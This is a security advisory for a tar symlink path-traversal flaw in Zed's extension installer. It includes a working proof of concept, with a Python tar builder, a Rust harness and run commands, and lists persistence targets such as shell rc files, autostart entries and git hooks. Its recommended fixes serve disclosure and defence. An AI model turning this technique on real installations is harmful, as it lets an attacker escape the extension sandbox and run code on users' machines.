
## Summary

Zed's extension installer allows tar/gzip downloads. The tar extractor (`async_tar::Archive::unpack`) creates symlinks from the archive without validation, and the path guard (`writeable_path_from_extension`) only performs lexical prefix checks without resolving symlinks.

An attacker can ship a tar that first creates a symlink inside the extension workdir pointing outside (e.g., `escape -> /`), then writes files through the symlink, causing writes to arbitrary host paths. This escapes the extension sandbox and enables code execution.

## Vulnerable Code Paths

- `crates/extension_host/src/wasm_host/wit/since_v0_8_0.rs:1030-1091` — `download_file` with `DownloadedFileType::GzipTar` calls `fs.extract_tar_file`

- `crates/fs/src/fs.rs:562-568` — `extract_tar_file` calls `async_tar::Archive::unpack` with no path or symlink validation

- `crates/extension_host/src/wasm_host.rs:724-731` — Path guard `writeable_path_from_extension` only does lexical prefix checks; it doesn't canonicalize, so symlinks planted in the workdir are followed

## PoC

### 1. Create malicious tar that plants a symlink and writes through it

```python
import tarfile
import io
import os

os.makedirs("/tmp/zed-tar-symlink", exist_ok=True)
tar_path = "/tmp/zed-tar-symlink/evil.tar"

with tarfile.open(tar_path, "w") as tar:
    # Symlink inside workdir pointing to filesystem root
    link = tarfile.TarInfo("evil/escape")
    link.type = tarfile.SYMTYPE
    link.linkname = "/"
    tar.addfile(link)

    # File entry that writes via the symlink to /tmp/zed_tar_symlink.txt
    data = b"owned_tar_symlink\n"
    f = tarfile.TarInfo("evil/escape/tmp/zed_tar_symlink.txt")
    f.size = len(data)
    tar.addfile(f, io.BytesIO(data))

print(f"wrote {tar_path}")
```

### 2. Harness using same extractor pattern as `fs::extract_tar_file`

**src/main.rs:**
```rust
use std::path::Path;
use async_std::{fs::File, io::BufReader, task};
use async_tar::Archive;

fn main() {
    task::block_on(async {
        let dest = Path::new("/tmp/zed-tar-symlink/dest"); // mimics extension workdir
        std::fs::create_dir_all(dest).unwrap();
        let f = File::open("/tmp/zed-tar-symlink/evil.tar").await.unwrap();
        Archive::new(BufReader::new(f)).unpack(dest).await.unwrap();
    });
}
```

**Cargo.toml:**
```toml
[package]
name = "zed-tar-symlink-poc"
version = "0.1.0"
edition = "2021"

[dependencies]
async-std = { version = "1", features = ["attributes"] }
async-tar = "0.4"
```

### 3. Run the harness

```bash
cd /tmp/zed-tar-symlink
cargo run
```

### 4. Observe file written outside destination (escaped via symlink)

```bash
ls -l /tmp/zed_tar_symlink.txt
# => exists, even though dest was /tmp/zed-tar-symlink/dest
```

## Impact

A tar delivered to the extension installer can plant a symlink and then write arbitrary files anywhere the user can write, escaping the extension sandbox and enabling RCE:

- Overwrite `~/.bashrc`, `~/.zshrc`, `~/.zprofile` → code execution on next terminal
- Write to `~/.config/autostart/` → code execution on next login
- PATH hijack via `~/.local/bin/`
- Modify git hooks, SSH config, etc.

## Recommended Fix

1. **Reject symlinks in tar archives** or validate their targets stay within the destination
2. **Canonicalize paths** in `writeable_path_from_extension` before prefix checks
3. **Use `unpack_in()` with path validation** instead of raw `unpack()`

```rust
// Before writing each entry:
let canonical = entry_path.canonicalize()?;
let dest_canonical = dest.canonicalize()?;
if !canonical.starts_with(&dest_canonical) {
    return Err("Path escapes destination");
}
```
